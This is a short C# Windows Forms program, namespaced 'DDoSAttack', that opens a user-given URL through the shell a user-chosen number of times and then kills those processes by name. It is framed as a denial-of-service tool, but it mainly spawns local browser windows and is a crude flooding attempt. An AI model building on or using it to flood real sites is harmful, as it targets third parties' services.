using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        String s;
        private void button1_Click(object sender, EventArgs e)
        {
            String num = textBox1.Text;
            int numOfProccess = int.Parse(num);
            var url = textBox2.Text;

            var ps = new System.Diagnostics.ProcessStartInfo();
            ps.UseShellExecute = true;
            ps.FileName = url;
            
            
            for (int i = 0;i<numOfProccess; i++)
            {
                Process p = new Process();
                p = System.Diagnostics.Process.Start(ps);
                s = p.ProcessName;
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process[] proc = Process.GetProcessesByName(s);
            foreach (Process pr in proc) {
                pr.Kill();
            }
        }
    }
}
